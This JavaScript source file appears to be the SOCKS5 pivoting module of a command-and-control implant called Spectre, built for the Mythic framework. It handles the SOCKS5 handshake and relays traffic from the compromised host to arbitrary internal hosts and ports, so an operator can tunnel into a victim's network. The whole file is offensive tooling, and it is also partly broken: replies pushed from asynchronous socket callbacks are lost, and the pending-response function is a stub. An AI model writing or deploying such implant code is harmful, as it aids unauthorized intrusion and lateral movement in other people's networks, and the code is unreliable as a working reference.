// ============================================================
// Spectre - SOCKS5 Proxy
// Implements SOCKS5 proxy for pivoting through the agent.
// Uses Node.js net module - no native addon needed.
// ============================================================

const SocksHandler = {
    _server: null,
    _connections: {},
    _nextConnId: 1,
    _isRunning: false,

    /**
     * Start the SOCKS5 proxy.
     * Mythic sends SOCKS data as part of get_tasking responses;
     * we process them and send traffic through local TCP connections.
     */
    start: function(params) {
        if (this._isRunning) {
            return {
                user_output: 'SOCKS proxy already running',
                completed: true,
                status: 'success',
            };
        }

        this._isRunning = true;

        return {
            user_output: 'SOCKS5 proxy started',
            completed: true,
            status: 'success',
        };
    },

    /**
     * Stop the SOCKS5 proxy and clean up connections.
     */
    stop: function() {
        this._isRunning = false;

        // Close all active connections
        for (const connId in this._connections) {
            try {
                this._connections[connId].destroy();
            } catch (e) {
                // Ignore cleanup errors
            }
        }
        this._connections = {};

        return {
            user_output: 'SOCKS5 proxy stopped',
            completed: true,
            status: 'success',
        };
    },

    /**
     * Handle incoming SOCKS data from Mythic.
     * Processes SOCKS5 protocol messages and manages TCP connections.
     */
    handleSocksData: function(socksData) {
        const net = require('net');
        const responses = [];

        for (let i = 0; i < socksData.length; i++) {
            const msg = socksData[i];
            const serverId = msg.server_id;
            const data = msg.data ? Buffer.from(msg.data, 'base64') : null;
            const exit = msg.exit;

            if (exit) {
                // Close connection
                if (this._connections[serverId]) {
                    this._connections[serverId].destroy();
                    delete this._connections[serverId];
                }
                continue;
            }

            if (!this._connections[serverId] && data) {
                // New connection - parse SOCKS5 handshake
                const parsed = this._parseSocks5Connect(data);
                if (!parsed) continue;

                const socket = new net.Socket();
                this._connections[serverId] = socket;

                const self = this;

                socket.connect(parsed.port, parsed.host, function() {
                    // Send success response
                    const successResp = Buffer.from([
                        0x05, 0x00, 0x00, 0x01,
                        0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00,
                    ]);
                    responses.push({
                        server_id: serverId,
                        data: successResp.toString('base64'),
                        exit: false,
                    });
                });

                socket.on('data', function(chunk) {
                    responses.push({
                        server_id: serverId,
                        data: chunk.toString('base64'),
                        exit: false,
                    });
                });

                socket.on('close', function() {
                    responses.push({
                        server_id: serverId,
                        data: '',
                        exit: true,
                    });
                    delete self._connections[serverId];
                });

                socket.on('error', function() {
                    responses.push({
                        server_id: serverId,
                        data: '',
                        exit: true,
                    });
                    delete self._connections[serverId];
                });

            } else if (this._connections[serverId] && data) {
                // Forward data to existing connection
                try {
                    this._connections[serverId].write(data);
                } catch (e) {
                    responses.push({
                        server_id: serverId,
                        data: '',
                        exit: true,
                    });
                    delete this._connections[serverId];
                }
            }
        }

        return responses;
    },

    /**
     * Parse SOCKS5 CONNECT request to extract target host:port.
     */
    _parseSocks5Connect: function(data) {
        if (data.length < 4) return null;

        // VER CMD RSV ATYP
        const ver = data[0];
        const cmd = data[1];
        const atyp = data[3];

        if (ver !== 0x05 || cmd !== 0x01) return null;

        let host, port;

        if (atyp === 0x01) {
            // IPv4
            if (data.length < 10) return null;
            host = data[4] + '.' + data[5] + '.' + data[6] + '.' + data[7];
            port = (data[8] << 8) + data[9];
        } else if (atyp === 0x03) {
            // Domain
            const domainLen = data[4];
            if (data.length < 5 + domainLen + 2) return null;
            host = data.slice(5, 5 + domainLen).toString('utf-8');
            port = (data[5 + domainLen] << 8) + data[6 + domainLen];
        } else if (atyp === 0x04) {
            // IPv6
            if (data.length < 22) return null;
            const parts = [];
            for (let i = 0; i < 8; i++) {
                parts.push(((data[4 + i * 2] << 8) + data[5 + i * 2]).toString(16));
            }
            host = parts.join(':');
            port = (data[20] << 8) + data[21];
        } else {
            return null;
        }

        return { host: host, port: port };
    },

    /**
     * Get pending SOCKS responses to send back to Mythic.
     */
    getPendingResponses: function() {
        // In a real implementation, this would drain a queue
        // For now, SOCKS data is handled inline with tasking
        return [];
    }
};
